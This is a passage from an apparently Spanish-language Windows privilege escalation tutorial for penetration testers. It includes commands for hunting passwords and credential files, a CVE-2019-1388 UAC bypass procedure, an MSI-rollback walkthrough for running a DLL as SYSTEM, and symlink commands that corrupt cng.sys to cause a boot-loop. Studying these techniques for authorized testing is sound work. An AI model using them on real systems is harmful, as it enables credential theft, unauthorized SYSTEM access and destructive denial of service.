%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Las bases de datos de Password Safe v3 suelen usar la extensión `.psafe3`. Considera que un nombre de archivo coincidente es un posible vault cifrado; su presencia no demuestra que puedas leerlo, desbloquearlo ni usar las credenciales almacenadas. Al revisar dónde se guardan estos archivos, comprueba los perfiles de usuario accesibles y las raíces configuradas para compartir archivos.

Un archivo `.kdbx` de KeePass legible también es solo una pista de que podría haber un vault cifrado. Para desbloquearlo se necesitan la contraseña maestra y cualquier archivo de claves o factor de cuenta configurado. Si una revisión autorizada encuentra un par de hashes LM:NT en una entrada, verifica la cuenta indicada y si el hash NT está vigente y es aceptado por el servicio NTLM del objetivo antes de considerar [pass-the-hash](../ntlm/README.md#pass-the-hash). Una entrada del vault no otorga por sí sola derechos de Administrator o SYSTEM; también deben cumplirse los requisitos de acceso al servicio remoto, los derechos de la cuenta y cualquier paso independiente de ejecución del servicio. El inventario debe indicar la ruta del vault y si es legible, no mostrar la base de datos ni las credenciales almacenadas.

Busca en todos los archivos propuestos:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credenciales en la Papelera de reciclaje

Revisa las entradas accesibles de la Papelera de reciclaje en busca de copias de seguridad y archivos de configuración eliminados, así como de archivos cuyos nombres mencionen explícitamente credenciales. Una copia de seguridad útil `.7z`, `.zip` o `.rar` puede tener meses de antigüedad y un nombre de archivo corriente. Windows almacena la ruta original y la hora de eliminación en un registro `$I`, y el archivo eliminado en su entrada `$R` correspondiente; inspecciona los metadatos y comprueba que la identidad actual tenga acceso de lectura antes de abrir un archivo comprimido. La visibilidad depende del volumen, el SID del usuario y los permisos de archivo, por lo que una lista vacía no demuestra que no haya ninguna copia de seguridad recuperable. Considera el nombre de un archivo comprimido como un posible candidato para revisión, no como prueba de que contiene un secreto válido.

Un `.pfx` eliminado y accesible también puede ser un indicio de **firma de código**. Si contiene una clave privada accesible, esta puede firmar un script de PowerShell modificado; [PowerShell requiere un certificado de firma de código con una clave privada](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), y [las reglas de publicador de AppLocker evalúan la identidad del firmante y el ámbito de la regla](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). La ejecución entre cuentas requiere que la identidad actual pueda modificar el script exacto, que una regla efectiva acepte la firma resultante para el script y la cuenta de destino, y que una tarea programada u otro proceso con privilegios superiores lo ejecute realmente. El nombre de un archivo `.pfx`, el sujeto del certificado o un script modificable por sí solos no demuestran que se cumpla esta cadena. Revisa los metadatos, las ACL, la política y el comando programado antes de abrir material de claves privadas o activar la tarea.

Revisa también las bases de datos de perfiles de clientes de mensajería, las notas y los archivos recibidos accesibles en busca de indicios relacionados con credenciales. Una exportación de recuperación de BitLocker puede estar almacenada como HTML o TXT, a veces dentro de un archivo de copia de seguridad con nombre. Ese material puede permitir el acceso a otro volumen de datos cifrado que contenga copias de seguridad antiguas; inspecciona el volumen y el archivo únicamente si tienes autorización para acceder a ellos. Si una copia de seguridad incluye `NTDS.dit`, la recuperación sin conexión de credenciales de dominio también requiere la sección `SYSTEM` correspondiente, tal como se describe en el [flujo de trabajo de copias de seguridad y grupos privilegiados](../active-directory-methodology/privileged-groups-and-token-privileges.md). Los nombres de archivo y un volumen bloqueado por sí solos no demuestran que exista una clave de recuperación utilizable ni una copia de seguridad de dominio.

Para **recuperar contraseñas** guardadas por varios programas, puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Deberías comprobar si hay bases de datos donde se almacenan las contraseñas de **Chrome, Edge o Firefox**.\
Comprueba también el historial, los marcadores y los favoritos de los navegadores, ya que quizá se hayan guardado algunas **contraseñas** allí.

Para el perfil **Default** convencional de Edge del usuario actual, `Login Data` se encuentra en `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, mientras que `Local State` está en el directorio `User Data` superior. [Microsoft documenta la ubicación predeterminada del perfil](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); otro perfil o una directiva `UserDataDir` pueden cambiarla. La presencia de estos archivos solo indica dónde buscar credenciales: confirma que los archivos sean legibles, que se disponga del contexto DPAPI del usuario correspondiente u otro material de claves autorizado, y que el inicio de sesión guardado pertenezca a una cuenta con mayores privilegios. Enumerar solo las rutas no requiere abrir la base de datos ni mostrar contraseñas descifradas.

Para Firefox, [Mozilla documenta](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) que `key4.db` y `logins.json` de un perfil son los archivos emparejados de clave e inicios de sesión cifrados. Su presencia solo indica dónde buscar: comprueba si ambos archivos son legibles, si existen entradas guardadas y si una Primary Password protege la clave antes de concluir que las credenciales se pueden utilizar. Si una credencial recuperada pertenece a una cuenta de dominio, revisa por separado los derechos efectivos de control de esa cuenta sobre los grupos y los [derechos de lectura o descifrado de contraseñas de LAPS](../active-directory-methodology/laps.md) del grupo; los artefactos del navegador por sí solos no demuestran que exista una vía para obtener privilegios de administrador.

Herramientas para extraer contraseñas de los navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software escritos en distintos lenguajes. Cada componente COM se **identifica mediante un class ID (CLSID)** y cada componente expone funcionalidades a través de una o más interfaces, identificadas mediante interface IDs (IIDs).

Las clases e interfaces COM se definen en el registro, respectivamente, en **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface**. Este registro se crea al combinar **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSID de este registro puedes encontrar la clave secundaria **InProcServer32**, que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel**, que puede ser **Apartment** (un solo subproceso), **Free** (varios subprocesos), **Both** (uno o varios subprocesos) o **Neutral** (independiente del subproceso).

![Historial de navegadores - COM DLL Overwriting: Dentro de los CLSID de este registro puedes encontrar la clave secundaria InProcServer32, que contiene un valor predeterminado que apunta a una DLL y un valor...](<../../images/image (729).png>)

En esencia, si puedes **sobrescribir cualquiera de las DLL** que se van a ejecutar, podrías **escalar privilegios** si esa DLL va a ser ejecutada por otro usuario.

Para aprender cómo usan los atacantes COM Hijacking como mecanismo de persistencia, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y el registro**

**Buscar contenido en archivos**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Buscar un archivo con un nombre de archivo determinado**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Buscar en el registro nombres de claves y contraseñas**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Herramientas que buscan contraseñas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf** que he creado para **ejecutar automáticamente todos los módulos POST de metasploit que buscan credenciales** en la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen contraseñas mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer contraseñas de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sesiones**, **nombres de usuario** y **contraseñas** de varias herramientas que guardan estos datos en texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Imagina que **un proceso que se ejecuta como SYSTEM abre un proceso nuevo** (`OpenProcess()`) con **acceso completo**. El mismo proceso **también crea un proceso nuevo** (`CreateProcess()`) **con pocos privilegios, pero heredando todos los handles abiertos del proceso principal**.\
Entonces, si tienes **acceso completo al proceso con pocos privilegios**, puedes obtener el **handle abierto al proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para obtener más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee [**esta otra publicación**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) para obtener una explicación más completa sobre cómo probar y abusar de más handles abiertos de procesos e hilos heredados con distintos niveles de permisos (no solo acceso completo).]

## Named Pipe Client Impersonation

Los segmentos de memoria compartida, denominados **pipes**, permiten la comunicación y la transferencia de datos entre procesos.

Windows ofrece una función llamada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de distintas redes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

Cuando un **client** envía datos a través de un pipe, el **server** que lo configuró puede **adoptar la identidad** del **client**, siempre que tenga los permisos necesarios de **SeImpersonate**. Identificar un **proceso privilegiado** que se comunica a través de un pipe que puedas imitar ofrece la oportunidad de **obtener más privilegios** al adoptar la identidad de ese proceso cuando interactúe con el pipe que estableciste. Para instrucciones sobre cómo llevar a cabo este ataque, consulta estas guías: [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar la comunicación de un named pipe con una herramienta como Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite enumerar y ver todos los pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Escritura remota de DWORD en Telephony tapsrv hasta RCE

El servicio Telephony (TapiSrv), en modo servidor, expone `\\pipe\\tapsrv` (MS-TRP). Un cliente remoto autenticado puede abusar de la ruta de eventos asíncronos basada en mailslots para convertir `ClientAttach` en una **escritura arbitraria de 4 bytes** en cualquier archivo existente en el que `NETWORK SERVICE` pueda escribir; después, puede obtener derechos de administrador de Telephony y cargar una DLL arbitraria como servicio. Flujo completo:

- `ClientAttach` con `pszDomainUser` configurado como una ruta existente en la que se pueda escribir → el servicio la abre mediante `CreateFileW(..., OPEN_EXISTING)` y la usa para escribir eventos asíncronos.
- Cada evento escribe en ese handle el `InitContext` controlado por el atacante, procedente de `Initialize`. Registra una aplicación de línea con `LRegisterRequestRecipient` (`Req_Func 61`), activa `TRequestMakeCall` (`Req_Func 121`), obtiene los eventos mediante `GetAsyncEvents` (`Req_Func 0`) y, luego, cancela el registro y cierra la conexión para repetir las escrituras de forma determinista.
- Añádete a `[TapiAdministrators]` en `C:\Windows\TAPI\tsec.ini`, vuelve a conectarte y, luego, llama a `GetUIDllName` con una ruta de DLL arbitraria para ejecutar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Más detalles:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varios

### Extensiones de archivo que pueden ejecutar cosas en Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### Abuso de Protocol handler / ShellExecute mediante renderizadores de Markdown

Los enlaces de Markdown en los que se puede hacer clic y que se pasan a `ShellExecuteExW` pueden activar controladores URI peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Consulta:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Supervisión de líneas de comandos en busca de contraseñas**

Al obtener una shell como usuario, puede haber tareas programadas u otros procesos en ejecución que **pasen credenciales en la línea de comandos**. El siguiente script captura las líneas de comandos de los procesos cada dos segundos y compara el estado actual con el anterior, mostrando las diferencias.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Robar contraseñas de los procesos

## De un usuario con pocos privilegios a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (mediante la consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar un terminal o cualquier otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y omitir UAC al mismo tiempo aprovechando la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y publicado por Microsoft.

Algunos de los sistemas afectados son los siguientes:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Tienes todos los archivos y la información necesaria en este repositorio de GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## De nivel de integridad Medium de Administrator a High / Bypass de UAC

Lee esto para **aprender sobre los niveles de integridad**:


{{#ref}}
integrity-levels.md
{{#endref}}

Después, **lee esto para aprender sobre UAC y los bypasses de UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions de directorios de carga en una raíz servida

Una aplicación puede crear un subdirectorio predecible para las cargas, escribir en él un nombre de archivo proporcionado por quien realiza la solicitud y luego procesar el archivo. Si un usuario con pocos privilegios puede eliminar ese subdirectorio y reemplazarlo por una junction NTFS antes de la escritura del servidor, la escritura puede seguir la junction hasta un directorio servido por la web. Un script colocado allí puede ejecutarse con la identidad del servicio web si el servidor ejecuta ese tipo de archivo. Este es un límite de escritura arbitraria específico de la aplicación; que un directorio de carga tenga permisos de escritura o que exista una junction no basta para demostrarlo.

Comprueba la construcción exacta de la ruta y el momento en que se usa en el controlador de carga, los permisos efectivos del usuario para eliminar/crear el subdirectorio, las ACL efectivas del destino, si el proceso que escribe sigue los puntos de reanálisis y si el servidor web ejecuta archivos en ese destino. Confirma por separado las identidades de los procesos que escriben y del servidor web. Un inventario pasivo puede mostrar las ACL de los directorios y los metadatos de reanálisis, pero no puede determinar el comportamiento del controlador ni confirmar un futuro cambio de junction. Si la ejecución ocurre con una cuenta de servicio, inspecciona el **token real del proceso** antes de considerar cualquier vía independiente basada en privilegios del token.

## De eliminación/movimiento/renombrado arbitrario de carpetas a EoP de SYSTEM

La técnica descrita [**en esta entrada del blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con código de exploit [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

El ataque consiste básicamente en abusar de la función de reversión de Windows Installer para reemplazar archivos legítimos por otros maliciosos durante la desinstalación. Para ello, el atacante debe crear un **instalador MSI malicioso** que se usará para secuestrar la carpeta `C:\Config.Msi`, que luego Windows Installer usará para guardar archivos de reversión durante la desinstalación de otros paquetes MSI. Los archivos de reversión se habrán modificado para que contengan la carga maliciosa.

La técnica resumida es la siguiente:

1. **Etapa 1: Preparar el secuestro (dejar `C:\Config.Msi` vacía)**

- Paso 1: Instalar el MSI
    - Crea un `.msi` que instale un archivo inofensivo (p. ej., `dummy.txt`) en una carpeta con permisos de escritura (`TARGETDIR`).
    - Marca el instalador como **"UAC Compliant"**, para que un **usuario que no sea administrador** pueda ejecutarlo.
    - Mantén abierto un **handle** al archivo después de la instalación.

- Paso 2: Iniciar la desinstalación
    - Desinstala el mismo `.msi`.
    - El proceso de desinstalación comienza a mover archivos a `C:\Config.Msi` y a renombrarlos como archivos `.rbf` (copias de seguridad de reversión).
    - **Consulta el handle abierto del archivo** mediante `GetFinalPathNameByHandle` para detectar cuándo el archivo pasa a ser `C:\Config.Msi\<random>.rbf`.

- Paso 3: Sincronización personalizada
    - El `.msi` incluye una **acción de desinstalación personalizada (`SyncOnRbfWritten`)** que:
        - Señala cuando se ha escrito el archivo `.rbf`.
        - Luego **espera** a otro evento antes de continuar con la desinstalación.

- Paso 4: Impedir la eliminación del `.rbf`
    - Cuando recibas la señal, **abre el archivo `.rbf`** sin `FILE_SHARE_DELETE`; esto **impide que se elimine**.
    - Luego, **envía una señal de vuelta** para que la desinstalación pueda terminar.
    - Windows Installer no logra eliminar el `.rbf` y, como no puede eliminar todo el contenido, **no elimina `C:\Config.Msi`**.

- Paso 5: Eliminar manualmente el `.rbf`
    - Tú, el atacante, eliminas el archivo `.rbf` manualmente.
    - Ahora **`C:\Config.Msi` está vacía**, lista para ser secuestrada.

> En este punto, **activa la vulnerabilidad de eliminación arbitraria de carpetas a nivel SYSTEM** para eliminar `C:\Config.Msi`.

2. **Etapa 2: Reemplazar los scripts de reversión por otros maliciosos**

- Paso 6: Volver a crear `C:\Config.Msi` con ACL débiles
    - Vuelve a crear la carpeta `C:\Config.Msi`.
    - Configura **DACL débiles** (p. ej., Everyone:F) y **mantén abierto un handle** con `WRITE_DAC`.

- Paso 7: Ejecutar otra instalación
    - Instala de nuevo el `.msi`, con:
        - `TARGETDIR`: una ubicación con permisos de escritura.
        - `ERROROUT`: una variable que provoque un error forzado.
    - Esta instalación se usará para activar de nuevo la **reversión**, que lee los archivos `.rbs` y `.rbf`.

- Paso 8: Supervisar la aparición de `.rbs`
    - Usa `ReadDirectoryChangesW` para supervisar `C:\Config.Msi` hasta que aparezca un nuevo `.rbs`.
    - Guarda su nombre de archivo.

- Paso 9: Sincronizar antes de la reversión
    - El `.msi` contiene una **acción de instalación personalizada (`SyncBeforeRollback`)** que:
        - Señala un evento cuando se crea el archivo `.rbs`.
        - Luego **espera** antes de continuar.

- Paso 10: Volver a aplicar las ACL débiles
    - Después de recibir el evento de «archivo `.rbs` creado»:
        - Windows Installer **vuelve a aplicar ACL fuertes** a `C:\Config.Msi`.
        - Pero, como aún tienes un handle con `WRITE_DAC`, puedes **volver a aplicar ACL débiles**.

> Las ACL **solo se aplican al abrir el handle**, así que todavía puedes escribir en la carpeta.

- Paso 11: Colocar archivos `.rbs` y `.rbf` falsos
    - Sobrescribe el archivo `.rbs` con un **script de reversión falso** que le indique a Windows que:
        - Restaure tu archivo `.rbf` (una DLL maliciosa) en una **ubicación privilegiada** (p. ej., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Coloca tu `.rbf` falso, que contiene una **DLL de carga maliciosa a nivel SYSTEM**.

- Paso 12: Activar la reversión
    - Envía la señal del evento de sincronización para que el instalador reanude el proceso.
    - Se configura una **acción personalizada de tipo 19 (`ErrorOut`)** para que **falle intencionalmente la instalación** en un punto conocido.
    - Esto hace que **comience la reversión**.

- Paso 13: SYSTEM instala tu DLL
    - Windows Installer:
        - Lee tu `.rbs` malicioso.
        - Copia tu DLL `.rbf` en la ubicación de destino.
    - Ahora tienes tu **DLL maliciosa en una ruta desde la que SYSTEM la carga**.

- Paso final: Ejecutar código como SYSTEM
    - Ejecuta un **binario de confianza con elevación automática** (p. ej., `osk.exe`) que cargue la DLL que secuestraste.
    - **¡Boom!** Tu código se ejecuta **como SYSTEM**.


### De eliminación/movimiento/renombrado arbitrario de archivos a EoP de SYSTEM

La técnica principal de reversión de MSI (la anterior) supone que puedes eliminar una **carpeta completa** (p. ej., `C:\Config.Msi`). Pero ¿qué pasa si tu vulnerabilidad solo permite la **eliminación arbitraria de archivos**?

Podrías explotar los **internals de NTFS**: cada carpeta tiene un flujo de datos alternativo oculto llamado:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Este stream almacena los **metadatos del índice** de la carpeta.

Así que, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del sistema de archivos.

Puedes hacerlo usando API estándar de eliminación de archivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Aunque estés llamando a una API para eliminar un *archivo*, **elimina la carpeta en sí**.

### De eliminar el contenido de una carpeta a EoP como SYSTEM
¿Qué pasa si tu primitive no te permite eliminar archivos/carpetas arbitrarios, pero **sí permite eliminar el *contenido* de una carpeta controlada por un atacante**?

1. Paso 1: Configura una carpeta y un archivo señuelo
- Crea: `C:\temp\folder1`
- Dentro, crea: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso con privilegios intenta eliminar `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Paso 3: Desencadenar un proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso analiza carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, se activa el **oplock** y cede el control a tu callback.

4. Paso 4: Dentro del callback del oplock: redirigir la eliminación

- Opción A: Mover `file1.txt` a otro lugar
    - Esto vacía `folder1` sin interrumpir el oplock.
    - No elimines `file1.txt` directamente: eso liberaría el oplock antes de tiempo.

- Opción B: Convertir `folder1` en una **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Esto apunta al flujo interno de NTFS que almacena los metadatos de la carpeta: eliminarlo elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### De la creación de carpetas arbitrarias a una DoS permanente

Aprovecha una primitiva que te permita **crear una carpeta arbitraria como SYSTEM/admin**, incluso si **no puedes escribir archivos** ni **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **controlador crítico de Windows**, por ejemplo:
```
C:\Windows\System32\cng.sys
```

- Esta ruta normalmente corresponde al driver en modo kernel `cng.sys`.
- Si la **creas previamente como carpeta**, Windows no puede cargar el driver real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Encuentra la carpeta, **no puede resolver el driver real** y **se bloquea o detiene el arranque**.
- **No hay alternativa** ni **recuperación** sin intervención externa (p. ej., reparación del arranque o acceso al disco).

### Desde rutas privilegiadas de logs/copias de seguridad + symlinks de OM hasta la sobrescritura arbitraria de archivos / DoS de arranque

Cuando un **servicio privilegiado** escribe logs/exportaciones en una ruta leída desde una **configuración modificable**, redirige esa ruta con **symlinks de Object Manager + puntos de montaje NTFS** para convertir la escritura privilegiada en una sobrescritura arbitraria (incluso **sin SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Requisitos**
- La configuración que almacena la ruta de destino debe ser modificable por el atacante (p. ej., `%ProgramData%\...\.ini`).
- Capacidad para crear un punto de montaje a `\RPC Control` y un symlink de archivo OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Una operación privilegiada que escriba en esa ruta (log, exportación, informe).

**Cadena de ejemplo**
1. Lee la configuración para obtener la ruta de destino del log privilegiado, p. ej., `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` en `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirige la ruta sin privilegios de administrador:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espera a que el componente con privilegios escriba el registro (p. ej., que un administrador active «enviar SMS de prueba»). La escritura ahora se realiza en `C:\Windows\System32\cng.sys`.
4. Inspecciona el destino sobrescrito (con un analizador hex/PE) para confirmar la corrupción; al reiniciar, Windows carga la ruta del driver manipulado → **DoS por bucle de arranque**. Esto también se aplica a cualquier archivo protegido que un servicio con privilegios vaya a abrir para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero, si existe una copia en `C:\Windows\System32\cng.sys`, se puede intentar cargar primero, lo que lo convierte en un destino fiable para provocar un DoS con datos corruptos.



## **De High Integrity a System**

### **Nuevo servicio**

Si ya se está ejecutando en un proceso High Integrity, la **ruta a SYSTEM** puede ser sencilla: basta con **crear y ejecutar un servicio nuevo**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Al crear un binario de servicio, asegúrate de que sea un servicio válido o de que el binario realice rápidamente las acciones necesarias, ya que se cerrará en 20 s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso de High Integrity, podrías intentar **habilitar las entradas del registro AlwaysInstallElevated** e **instalar** una reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las claves del registro involucradas y sobre cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### De High + privilegio SeImpersonate a System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate a privilegios de Full Token

Si tienes esos privilegios de token (probablemente los encontrarás en un proceso que ya tenga High Integrity), podrás **abrir casi cualquier proceso** (excepto los procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Con esta técnica, normalmente se **selecciona cualquier proceso que se ejecute como SYSTEM y tenga todos los privilegios del token** (_sí, puedes encontrar procesos SYSTEM que no tengan todos los privilegios del token_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Meterpreter utiliza esta técnica para escalar privilegios en `getsystem`. Consiste en **crear un pipe y luego crear o abusar de un servicio para que escriba en ese pipe**. Después, el **servidor** que creó el pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente del pipe (el servicio) y obtener privilegios SYSTEM.\
Si quieres [**aprender más sobre los name pipes, lee esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo pasar de High Integrity a System usando name pipes, lee esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si consigues **secuestrar una dll** que esté **cargando** un **proceso** que se ejecuta como **SYSTEM**, podrás ejecutar código arbitrario con esos permisos. Por lo tanto, Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es **mucho más fácil de conseguir desde un proceso con High Integrity**, ya que tendrá **permisos de escritura** en las carpetas utilizadas para cargar dlls.\
**Puedes** [**aprender más sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

